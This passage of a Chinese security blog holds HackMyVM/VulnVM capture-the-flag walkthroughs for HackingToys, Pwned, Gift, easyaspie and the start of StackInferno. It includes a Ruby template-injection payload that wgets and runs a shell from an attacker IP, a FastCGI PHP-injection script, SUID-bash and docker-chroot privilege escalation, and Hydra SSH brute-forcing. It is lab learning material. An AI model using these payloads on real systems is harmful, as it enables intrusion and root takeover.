caught\u0026lt;/title\u0026gt;\r| \u0026lt;style\u0026gt;\r| body {\r| background-color: #FAFAFA;\r| color: #333;\r| color-scheme: light dark;\r| supported-color-schemes: light dark;\r| margin: 0px;\r| body, p, ol, ul, td {\r| font-family: helvetica, verdana, arial, sans-serif;\r| font-size: 13px;\r| line-height: 18px;\r| font-size: 11px;\r| white-space: pre-wrap;\r| pre.box {\r| border: 1px solid #EEE;\r| padding: 10px;\r| margin: 0px;\r| width: 958px;\r| header {\r| color: #F0F0F0;\r| background: #C00;\r|_ padding: 查看3000端口服务，是Ruby on rails\nSSTI #\r关于Ruby模板的那些事 - FreeBuf网络安全行业门户 发现消息提示框框中存在模板注入\n利用模板，记得要URLencode\n\u0026lt;%= 7 * 7 %\u0026gt;\r\u0026lt;%= File.open(\u0026#39;/etc/passwd\u0026#39;).read %\u0026gt; \u0026lt;%= system(\u0026#39;wget 192.168.55.4/shell\u0026#39;) %\u0026gt;\r\u0026lt;%= system(\u0026#39;bash shell\u0026#39;) %\u0026gt; 成功得到反弹shell\nOwn dodi #\r查看内网端口\nlidia@hacktoys:~$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 1024 0.0.0.0:3000 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 511 127.0.0.1:80 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:9000 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:* 将其转出来\n[root@kali] /home/kali/Desktop/penelope (main) ❯ ssh -i ~/.ssh/id_rsa lidia@192.168.55.10 -L 80:127.0.0.1:80 -L 9000:127.0.0.1:9000 80端口好像没有什么东西，因为在**/var/www/html**里面能看到\nPHP-FPM默认监听9000端口，如果这个端口可以被我们直接访问到，则我们可以自己构造fastcgi协议，和fpm进行通信。\nlidia@hacktoys:~$ cat /etc/apache2/sites-enabled/fastcgi.conf\r\u0026lt;VirtualHost 127.0.0.1:80\u0026gt;\rServerAdmin webmaster@localhost\rDocumentRoot /var/www/html\r\u0026lt;Directory /var/www/html\u0026gt;\rOptions +ExecCGI\rAddHandler fcgid-script .fcgi\rFCGIWrapper /usr/lib/cgi-bin/php-cgi .php\rDirectoryIndex index.php index.html\rAllowOverride All\rRequire all granted\r\u0026lt;/Directory\u0026gt;\rErrorLog ${APACHE_LOG_DIR}/error.log\rCustomLog ${APACHE_LOG_DIR}/access.log combined\r\u0026lt;/VirtualHost\u0026gt; 因此可以参考：9000 - Pentesting FastCGI - HackTricks\nlidia@hacktoys:~$ cat a.sh #!/bin/bash\rPAYLOAD=\u0026#34;\u0026lt;?php echo \u0026#39;\u0026lt;!--\u0026#39;; system(\u0026#39;whoami\u0026#39;); echo \u0026#39;--\u0026gt;\u0026#39;;\u0026#34;\rFILENAMES=\u0026#34;/var/www/html/index.php\u0026#34; # Exisiting file path\rHOST=$1\rB64=$(echo \u0026#34;$PAYLOAD\u0026#34;|base64)\rfor FN in $FILENAMES; do\rOUTPUT=$(mktemp)\renv -i \\\rPHP_VALUE=\u0026#34;allow_url_include=1\u0026#34;$\u0026#39;\\n\u0026#39;\u0026#34;allow_url_fopen=1\u0026#34;$\u0026#39;\\n\u0026#39;\u0026#34;auto_prepend_file=\u0026#39;data://text/plain\\;base64,$B64\u0026#39;\u0026#34; \\\rSCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \\\rcgi-fcgi -bind -connect $HOST:9000 \u0026amp;\u0026gt; $OUTPUT\rcat $OUTPUT\rdone 成功执行了命令\nRoot #\rdodi@hacktoys:~$ sudo -l\rMatching Defaults entries for dodi on hacktoys:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser dodi may run the following commands on hacktoys:\r(ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh\rdodi@hacktoys:~$ cat /usr/local/bin/rvm_rails.sh #!/bin/bash\rexport rvm_prefix=/usr/local\rexport MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0\rexport RUBY_VERSION=ruby-3.1.0\rexport rvm_version=1.29.12\rexport rvm_bin_path=/usr/local/rvm/bin\rexport GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global\rexport GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0\rexport PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin\rexport IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc\rexport rvm_path=/usr/local/rvm\rexec /usr/local/rvm/gems/ruby-3.1.0/bin/rails \u0026#34;$@\u0026#34; 注意到这个目录，之前lidia是可以写入的\n因此可以修改脚本内容\nlidia@hacktoys:/usr/local/rvm/gems/ruby-3.1.0/bin$ mv rails rails.bak\rlidia@hacktoys:/usr/local/rvm/gems/ruby-3.1.0/bin$ echo \u0026#39;chmod u+s /usr/bin/bash\u0026#39; \u0026gt; rails\rlidia@hacktoys:/usr/local/rvm/gems/ruby-3.1.0/bin$ chmod +x rails\rdodi@hacktoys:~$ sudo /usr/local/bin/rvm_rails.sh Summary #\rUser：Ruby模板注入拿到lidia，通过内网端口的FastCGI漏洞拿到dodi\nRoot：通过lidia修改脚本内容，即可提权。\n","date":"2025-04-21","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-hackingtoys/","section":"Posts","summary":"","title":"HackMyVM-HackingToys","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.158 -sV -A -p- PORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)\r| 256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)\r|_ 256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-server-header: Apache/2.4.38 (Debian)\r|_http-title: Pwned....!! Feroxbuster #\r[root@kali] /home/kali/pwned ❯ feroxbuster -u http://192.168.55.6/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x php,txt\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://192.168.55.6/\r🚀 Threads │ 50\r📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [php, txt]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r404 GET 9l 31w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 403 GET 9l 28w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 16l 27w 194c http://192.168.55.6/nothing/nothing.html\r200 GET 75l 191w 3065c http://192.168.55.6/\r200 GET 4l 7w 41c http://192.168.55.6/robots.txt\r301 GET 9l 28w 314c http://192.168.55.6/nothing =\u0026gt; http://192.168.55.6/nothing/\r301 GET 9l 28w 318c http://192.168.55.6/hidden_text =\u0026gt; http://192.168.55.6/hidden_text/\r200 GET 22l 21w 211c http://192.168.55.6/hidden_text/secret.dic 下载这个dic用作扫描字典\n[root@kali] /home/kali/pwned ❯ feroxbuster -u http://192.168.55.6/ -w ./secret.dic -x php,txt ___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.11.0\r───────────────────────────┬──────────────────────\r🎯 Target Url │ http://192.168.55.6/\r🚀 Threads │ 50\r📖 Wordlist │ ./secret.dic\r👌 Status Codes │ All Status Codes!\r💥 Timeout (secs) │ 7\r🦡 User-Agent │ feroxbuster/2.11.0\r💉 Config File │ /etc/feroxbuster/ferox-config.toml\r🔎 Extract Links │ true\r💲 Extensions │ [php, txt]\r🏁 HTTP methods │ [GET]\r🔃 Recursion Depth │ 4\r───────────────────────────┴──────────────────────\r🏁 Press [ENTER] to use the Scan Management Menu™\r──────────────────────────────────────────────────\r403 GET 9l 28w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 404 GET 9l 31w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 16l 27w 194c http://192.168.55.6/nothing/nothing.html\r200 GET 75l 191w 3065c http://192.168.55.6/\r301 GET 9l 28w 317c http://192.168.55.6/pwned.vuln =\u0026gt; http://192.168.55.6/pwned.vuln/ 存在pwned.vuln路径，在源代码中发现了用户凭证\n[root@kali] /home/kali/pwned ❯ curl http://192.168.55.6/pwned.vuln/ ..............\r..............\r\u0026lt;?php\r// if (isset($_POST[\u0026#39;submit\u0026#39;])) {\r// $un=$_POST[\u0026#39;username\u0026#39;];\r// $pw=$_POST[\u0026#39;password\u0026#39;];\r//\r// if ($un==\u0026#39;ftpuser\u0026#39; \u0026amp;\u0026amp; $pw==\u0026#39;B0ss_B!TcH\u0026#39;) {\r// echo \u0026#34;welcome\u0026#34;\r// exit();\r// }\r// else // echo \u0026#34;Invalid creds\u0026#34;\r// }\r?\u0026gt; FTP #\r[root@kali] /home/kali/pwned ❯ ftp 192.168.55.6 Connected to 192.168.55.6.\r220 (vsFTPd 3.0.3)\rName (192.168.55.6:kali): ftpuser\r331 Please specify the password.\rPassword: 230 Login successful.\rRemote system type is UNIX.\rUsing binary mode to transfer files.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||5205|)\r150 Here comes the directory listing.\rdrwxr-xr-x 2 0 0 4096 Jul 10 2020 share\r226 Directory send OK.\rftp\u0026gt; cd share\r250 Directory successfully changed.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||6289|)\r150 Here comes the directory listing.\r-rw-r--r-- 1 0 0 2602 Jul 09 2020 id_rsa\r-rw-r--r-- 1 0 0 75 Jul 09 2020 note.txt\r226 Directory send OK.\rftp\u0026gt; 得到一个密钥和留言，可以用于登录\n[root@kali] /home/kali/pwned ❯ chmod 600 id_rsa ⏎\r[root@kali] /home/kali/pwned ❯ ssh -i id_rsa ariana@192.168.55.6\rLinux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\rThe programs included with the Debian GNU/Linux system are free software;\rthe exact distribution terms for each program are described in the\rindividual files in /usr/share/doc/*/copyright.\rDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\rpermitted by applicable law.\rLast login: Fri Jul 10 13:03:23 2020 from 192.168.18.70\rariana@pwned:~$ ls\rariana-personal.diary user1.txt\rariana@pwned:~$ Own selena #\rariana@pwned:~$ sudo -l\rMatching Defaults entries for ariana on pwned:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser ariana may run the following commands on pwned:\r(selena) NOPASSWD: /home/messenger.sh 查看该脚本信息\nariana@pwned:~$ cat /home/messenger.sh #!/bin/bash\rclear\recho \u0026#34;Welcome to linux.messenger \u0026#34;\recho \u0026#34;\u0026#34;\rusers=$(cat /etc/passwd | grep home | cut -d/ -f 3)\recho \u0026#34;\u0026#34;\recho \u0026#34;$users\u0026#34;\recho \u0026#34;\u0026#34;\rread -p \u0026#34;Enter username to send message : \u0026#34; name echo \u0026#34;\u0026#34;\rread -p \u0026#34;Enter message for $name :\u0026#34; msg\recho \u0026#34;\u0026#34;\recho \u0026#34;Sending message to $name \u0026#34;\r$msg 2\u0026gt; /dev/null\recho \u0026#34;\u0026#34;\recho \u0026#34;Message sent to $name :) \u0026#34;\recho \u0026#34;\u0026#34; 可以看到msg是拼接在 2\u0026gt;/dev/null前面没有任何过滤的\n只需要将msg输入为**/bin/bash即可生成一个shell**\nWelcome to linux.messenger ariana:\rselena:\rftpuser:\rEnter username to send message : ariana\rEnter message for ariana :/bin/bash\rSending message to ariana whoami\rselena\rid\ruid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker) Root #\r发现当前环境是Docker\nselena@pwned:~$ ip a\r1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host valid_lft forever preferred_lft forever\r2: enp0s3: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\rlink/ether 08:00:27:32:e3:ef brd ff:ff:ff:ff:ff:ff\rinet 192.168.55.6/24 brd 192.168.55.255 scope global dynamic enp0s3\rvalid_lft 529sec preferred_lft 529sec\rinet6 fe80::a00:27ff:fe32:e3ef/64 scope link valid_lft forever preferred_lft forever\r3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:cf:75:ba:55 brd ff:ff:ff:ff:ff:ff\rinet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\rvalid_lft forever preferred_lft forever 并且用户是在docker组中\ndocker | GTFOBins selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\r# whoami\rroot\r# id\ruid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) Summary #\r没啥好写的，就当刷题了\n","date":"2025-04-20","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-pwned/","section":"Posts","summary":"","title":"HackMyVM-Pwned","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.157 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.3 (protocol 2.0)\r| ssh-hostkey: | 3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)\r| 256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)\r|_ 256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)\r80/tcp open http nginx\r|_http-title: Site doesn\u0026#39;t have a title (text/html). 目录扫描失败\n[root@kali] /home/kali ❯ curl \u0026#34;http://192.168.56.157/\u0026#34; -v * Trying 192.168.56.157:80...\r* Connected to 192.168.56.157 (192.168.56.157) port 80\r* using HTTP/1.x\r\u0026gt; GET / HTTP/1.1\r\u0026gt; Host: 192.168.56.157\r\u0026gt; User-Agent: curl/8.12.1\r\u0026gt; Accept: */*\r\u0026gt; * Request completely sent off\r\u0026lt; HTTP/1.1 200 OK\r\u0026lt; Server: nginx\r\u0026lt; Date: Sat, 19 Apr 2025 06:42:57 GMT\r\u0026lt; Content-Type: text/html\r\u0026lt; Content-Length: 57\r\u0026lt; Last-Modified: Sun, 20 Sep 2020 16:29:39 GMT\r\u0026lt; Connection: keep-alive\r\u0026lt; ETag: \u0026#34;5f678373-39\u0026#34;\r\u0026lt; Accept-Ranges: bytes\r\u0026lt; Dont Overthink. Really, Its simple.\r\u0026lt;!-- Trust me --\u0026gt;\r* Connection #0 to host 192.168.56.157 left intact Hydra to ssh #\r尝试使用simple爆破登录\n发现simple不是用户名而是密码\n[root@kali] /home/kali ❯ hydra -L ./Desktop/fuzzDicts/userNameDict/user.txt -p simple ssh://192.168.56.157 -I Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 14:45:35\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 8886 login tries (l:8886/p:1), ~556 tries per task\r[DATA] attacking ssh://192.168.56.157:22/\r[22][ssh] host: 192.168.56.157 login: root password: simple 登录拿到flag\n[root@kali] /home/kali ❯ ssh root@192.168.56.157 The authenticity of host \u0026#39;192.168.56.157 (192.168.56.157)\u0026#39; can\u0026#39;t be established.\rED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.\rThis key is not known by any other names.\rAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\rWarning: Permanently added \u0026#39;192.168.56.157\u0026#39; (ED25519) to the list of known hosts.\rroot@192.168.56.157\u0026#39;s password: IM AN SSH SERVER\rgift:~# whoami\rroot\rgift:~# ls\rroot.txt user.txt ","date":"2025-04-19","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-gift/","section":"Posts","summary":"","title":"HackMyVM-Gift","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/homelab ❯ nmap 192.168.56.156 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 8c:c5:70:a6:8f:7c:53:6f:98:6d:01:9c:63:b7:3b:60 (RSA)\r| 256 31:1f:74:73:32:ff:8e:f0:f9:63:fb:51:13:98:32:27 (ECDSA)\r|_ 256 7e:1f:ea:1b:50:38:d8:88:5a:fc:cb:6f:70:3f:25:0b (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.41 (Ubuntu) Gobuster #\r[root@kali] /home/kali/homelab ❯ gobuster dir -u http://192.168.56.156/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50 ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.156/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/note.txt (Status: 200) [Size: 162]\r/server-status (Status: 403) [Size: 279]\rProgress: 661680 / 661683 (100.00%)\r=============================================================== 查看**/note.txt**\n#http://192.168.56.156/note.txt\rHi Alex,\rI wanted to inform you that Iâ€™ve changed your password. Please let me know if you need the new details or if you encounter any issues.\rBest regards! Hydra #\r尝试爆破ssh\n[root@kali] /home/kali/homelab ❯ hydra -l alex -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.156 -I ⏎\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-19 11:10:33\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task\r[DATA] attacking ssh://192.168.56.156:22/\r[22][ssh] host: 192.168.56.156 login: alex password: princess1\r1 of 1 target successfully completed, 1 valid password found 得到密码是：princess1\nRoot #\ralex@easyaspie:~$ sudo -l\rMatching Defaults entries for alex on easyaspie:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser alex may run the following commands on easyaspie:\r(ALL) NOPASSWD: /bin/bash 直接开启bash就行了\nalex@easyaspie:~$ sudo /bin/bash\rroot@easyaspie:/home/alex# whoami\rroot\rroot@easyaspie:/home/alex# Summary #\r毫无营养的一个靶机，居然还有4个G的大小，结果就整这种玩意，浪费时间。\n","date":"2025-04-19","externalUrl":null,"permalink":"/posts/2025/04/vulnvm-easyaspie/","section":"Posts","summary":"","title":"VulnVM-easyaspie","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium 提权部分为非预期\nNmap #\r[root@kali] /home/kali/stackinferno ❯ nmap 172.17.0.2 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 88:00:5f:26:eb:50:e4:55:6d:0a:0c:73:58:99:cd:2d (ECDSA)\r|_ 256 6b:36:5c:a3:c0:8b:22:b7:35:11:86:f1:7e:7f:77:5b (ED25519)\r80/tcp open http Werkzeug/2.2.2 Python/3.11.2\r|_http-server-header: Werkzeug/2.2.2 Python/3.11.2\r| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 302 FOUND\r| Server: Werkzeug/2.2.2 Python/3.11.2\r| Date: Wed, 16 Apr 2025 03:01:23 GMT\r| Content-Type: text/html; charset=utf-8\r| Content-Length: 223\r| Location: http://cybersec.dl\r| Connection: close\r| \u0026lt;!doctype html\u0026gt;\r| \u0026lt;html lang=en\u0026gt;\r| \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt;\r| \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt;\r| \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://cybersec.dl\u0026#34;\u0026gt;http://cybersec.dl\u0026lt;/a\u0026gt;. If not, click the link.\r| GetRequest, HTTPOptions: | HTTP/1.1 302 FOUND\r| Server: Werkzeug/2.2.2 Python/3.11.2\r| Date: Wed, 16 Apr 2025 03:01:18 GMT\r| Content-Type: text/html; charset=utf-8\r| Content-Length: 223\r| Location: http://cybersec.dl\r| Connection: close\r| \u0026lt;!doctype html\u0026gt;\r| \u0026lt;html lang=en\u0026gt;\r| \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt;\r| \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt;\r| \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://cybersec.dl\u0026#34;\u0026gt;http://cybersec.dl\u0026lt;/a\u0026gt;. If not, click the link.\r| RTSPRequest: | \u0026lt;!DOCTYPE HTML\u0026gt;\r| \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r| \u0026lt;head\u0026gt;\r| \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\r| \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt;\r| \u0026lt;/head\u0026gt;\r| \u0026lt;body\u0026gt;\r| \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt;\r| \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt;\r| \u0026lt;p\u0026gt;Message: Bad request version (\u0026#39;RTSP/1.0\u0026#39;).\u0026lt;/p\u0026gt;\r| \u0026lt;p\u0026gt;Error code explanation: 400 - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt;\r| \u0026lt;/body\u0026gt;\r|_ \u0026lt;/html\u0026gt;\r|_http-title: CyberSec Corp - Expertos en Ciberseguridad 添加域名：cybersec.dl\nAPI Fuzz #\r查看源码，发现有js拦截，可以另外提前开一个F12，然后手动输入url跳转\n可以看到存在一个**/api**路径，里面给出的密码都是没用的\n扫描一下其他的接口\n[root@kali] /home/kali/stackinferno ❯ gobuster dir -u http://cybersec.dl/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://cybersec.dl/api\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/interest (Status: 405) [Size: 153] 注意必须使用POST发包，发现到需要设置一个请求头\n[root@kali] /home/kali/stackinferno ❯ curl http://cybersec.dl/api/interest \u0026lt;!doctype html\u0026gt;\r\u0026lt;html lang=en\u0026gt;\r\u0026lt;title\u0026gt;405 Method Not Allowed\u0026lt;/title\u0026gt;\r\u0026lt;h1\u0026gt;Method Not Allowed\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;The method is not allowed for the requested URL.\u0026lt;/p\u0026gt;\r[root@kali] /home/kali/stackinferno ❯ curl -X POST http://cybersec.dl/api/interest {\r\u0026#34;message\u0026#34;: \u0026#34;Error: \u0026#39;Role\u0026#39; header not provided\u0026#34;\r} 对这个Role进行用户枚举\n[root@kali] /home/kali/stackinferno ❯ ffuf -X POST -u \u0026#39;http://cybersec.dl/api/interest\u0026#39; -H \u0026#39;Role: FUZZ\u0026#39; -w ../Desktop/fuzzDicts/userNameDict/user.txt -fc 403 ⏎\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : POST\r:: URL : http://cybersec.dl/api/interest\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/userNameDict/user.txt\r:: Header : Role: FUZZ\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response status: 403\r________________________________________________\ruser [Status: 200, Size: 237, Words: 39, Lines: 10, Duration: 38ms]\rAdministrator [Status: 200, Size: 781, Words: 83, Lines: 14, Duration: 39ms]\r:: Progress: [8886/8886] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:08] :: Errors: 0 :: 设置为管理员查看回显，所有域名中，有用的就只有：0internal_down.cybersec.dl\n[root@kali] /home/kali/stackinferno ❯ curl -X POST http://cybersec.dl/api/interest -H \u0026#34;Role: Administrator\u0026#34; {\r\u0026#34;company\u0026#34;: {\r\u0026#34;URLs_web\u0026#34;: \u0026#34;cybersec.dl, soc_internal_operations.cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.htb/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.htb/documents, cybersec.htb/api/cpu, cybersec.htb/api/login\u0026#34;,\r\u0026#34;UUID\u0026#34;: \u0026#34;f47ac10b-58cc-4372-a567-0e02b2c3d479, df7ac10b-58mc-43fx-a567-0e02b2r3d479\u0026#34;,\r\u0026#34;address\u0026#34;: \u0026#34;New York, EEUU\u0026#34;,\r\u0026#34;branches\u0026#34;: \u0026#34;Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland\u0026#34;,\r\u0026#34;customers\u0026#34;: \u0026#34;ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;CyberSec Corp\u0026#34;,\r\u0026#34;phone\u0026#34;: \u0026#34;+1322302450134200\u0026#34;,\r\u0026#34;services\u0026#34;: \u0026#34;Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad\u0026#34;\r},\r\u0026#34;message\u0026#34;: \u0026#34;Acceso permitido\u0026#34;\r} 访问需要设置UUID头，这里可以直接使用上获取到的\n[root@kali] /home/kali/stackinferno ❯ curl http://0internal_down.cybersec.dl \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;es\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;403 - Acceso denegado\u0026lt;/title\u0026gt;\r\u0026lt;style\u0026gt;\rbody {\rfont-family: Arial, sans-serif;\rbackground-color: #f4f4f4;\rcolor: #333;\rtext-align: center;\rpadding: 50px;\r}\rh1 {\rcolor: #d9534f;\r}\rp {\rfont-size: 